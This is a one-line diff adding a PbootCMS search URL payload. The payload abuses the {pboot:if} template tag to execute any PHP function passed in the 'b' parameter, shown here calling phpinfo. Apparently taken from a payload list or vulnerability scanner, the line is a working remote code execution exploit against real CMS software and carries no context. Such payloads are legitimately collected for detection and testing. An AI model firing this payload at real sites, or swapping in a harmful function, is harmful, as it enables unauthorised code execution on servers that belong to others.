@@ -1,0 +1,1 @@
+/index.php/Search/index?keyword={pboot:if(true)$a=$_GET[b];$a();//%20)})}{/pboot:if}&b=phpinfo
